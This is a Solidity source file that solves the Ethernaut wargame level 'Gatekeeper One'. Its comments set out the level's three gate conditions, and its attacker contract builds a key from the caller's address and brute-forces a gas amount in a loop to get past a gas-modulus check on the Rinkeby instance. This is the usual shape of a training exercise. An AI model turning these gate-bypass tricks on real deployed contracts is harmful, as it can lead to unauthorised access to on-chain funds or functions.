// # Ethernaut 13: Gatekeeper One
//
// The three gates of `Gatekeeper One`:
// 1. `msg.sender` must not be `tx.origin` (as in `Telephone`).
// 2. The amount of gas left at execution of `gateTwo` must be a multiple of 8191.
// 3. `key` must fulfil these conditions:
//     - Bytes 4 and 5 must be zero. (Counting from the left and from zero.)
//     - Bytes 6 and 7 must be equal to the lowest two bytes of `tx.origin` (which, in the attacker
//       contract, is identical with `msg.sender`).
//     - Bytes 0..3 must not all be zero.

pragma solidity ^0.6.0;

import "./13_GatekeeperOne.sol";

contract GatekeeperOneAttack {
    GatekeeperOne public instance;

    constructor (address instanceAddr) public {
        instance = GatekeeperOne(instanceAddr);
    }

    function passGate () public {
        uint64 ukey = 0xffffffff00000000 + uint16(msg.sender);
        bytes8 key = bytes8(ukey);
        uint addGas = 250;
        bool result = false;

        // Since the value of `gasleft()` in `gateTwo` that was observed while simulating
        // the attack locally does not match the one obtained when attacking the actual
        // instance on Rinkeby, we guess in a range of 100 around the value that we found.
        while(!result && addGas < 350) {
            try instance.enter.gas(4 * 8191 + addGas)(key) returns (bool _result) {
                result = _result;
            } catch {
            }

            addGas++;
        }
    }
}
